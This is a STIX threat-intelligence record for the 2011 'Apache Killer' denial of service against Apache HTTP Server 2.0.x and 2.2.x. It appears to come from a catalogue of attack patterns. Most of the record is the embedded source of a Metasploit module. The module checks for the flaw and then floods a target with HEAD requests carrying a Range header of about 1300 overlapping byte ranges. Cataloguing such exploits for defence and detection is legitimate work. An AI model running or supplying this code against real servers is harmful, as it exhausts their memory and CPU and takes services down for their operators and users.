{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f0c4f333-604d-4f72-bae8-f764a8d0435c",
    "created": "2024-08-14T16:26:14.086886Z",
    "modified": "2024-08-14T16:26:14.086891Z",
    "name": "Apache Range Header DoS (Apache Killer)",
    "description": " The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x through 2.2.19 allows remote attackers to cause a denial of service (memory and CPU consumption) via a Range header that expresses multiple overlapping ranges exploit called \"Apache Killer\" ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/apache_range_dos.rb",
            "external_id": "apache_range_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3192"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Range Header DoS (Apache Killer)',\n      'Description'    => %q{\n          The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x\n        through 2.2.19 allows remote attackers to cause a denial of service (memory and\n        CPU consumption) via a Range header that expresses multiple overlapping ranges,\n        exploit called \"Apache Killer\"\n      },\n      'Author'         =>\n        [\n          'Kingcope', #original discoverer\n          'Masashi Fujiwara', #metasploit module\n          'Markus Neis <markus.neis[at]gmail.com>' # check for vulnerability\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          ['DOS', 'Description' => 'Trigger Denial of Service against target'],\n          ['CHECK', 'Description' => 'Check if target is vulnerable']\n        ],\n      'DefaultAction'  => 'DOS',\n      'References'     =>\n        [\n          [ 'BID', '49303'],\n          [ 'CVE', '2011-3192'],\n          [ 'EDB', '17696'],\n          [ 'OSVDB', '74721' ],\n        ],\n      'DisclosureDate' => '2011-08-19'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('URI', [ true,  \"The request URI\", '/']),\n        OptInt.new('RLIMIT', [ true,  \"Number of requests to send\",50])\n      ])\n  end\n\n  def run_host(ip)\n\n    case action.name\n    when 'DOS'\n      conduct_dos()\n\n    when 'CHECK'\n      check_for_dos()\n    end\n\n  end\n\n  def check_for_dos()\n    uri = datastore['URI']\n    rhost = datastore['RHOST']\n    begin\n      res = send_request_cgi({\n        'uri'     =>  uri,\n        'method'  => 'HEAD',\n        'headers' => {\n          \"HOST\"  => rhost,\n          \"Range\" => \"bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10\",\n          \"Request-Range\" => \"bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10\"\n        }\n      })\n\n      if (res and res.code == 206)\n        print_status(\"Response was #{res.code}\")\n        print_status(\"Found Byte-Range Header DOS at #{uri}\")\n\n        report_note(\n          :host   => rhost,\n          :port   => rport,\n          :type   => 'apache.killer',\n          :data   => \"Apache Byte-Range DOS at #{uri}\"\n        )\n\n      else\n        print_status(\"#{rhost} doesn't seem to be vulnerable at #{uri}\")\n      end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\n\n\n  def conduct_dos()\n    uri = datastore['URI']\n    rhost = datastore['RHOST']\n    ranges = ''\n    for i in (0..1299) do\n      ranges += \",5-\" + i.to_s\n    end\n    for x in 1..datastore['RLIMIT']\n      begin\n        print_status(\"Sending DoS packet #{x} to #{rhost}:#{rport}\")\n        res = send_request_cgi({\n          'uri'     =>  uri,\n          'method'  => 'HEAD',\n          'headers' => {\n            \"HOST\"  => rhost,\n            \"Range\" => \"bytes=0-#{ranges}\",\n            \"Request-Range\" => \"bytes=0-#{ranges}\"}},1)\n\n      rescue ::Rex::ConnectionRefused\n        print_error(\"Unable to connect to #{rhost}:#{rport}\")\n      rescue ::Errno::ECONNRESET\n        print_good(\"DoS packet successful. #{rhost} not responding.\")\n      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        print_error(\"Couldn't connect to #{rhost}:#{rport}\")\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-19"
}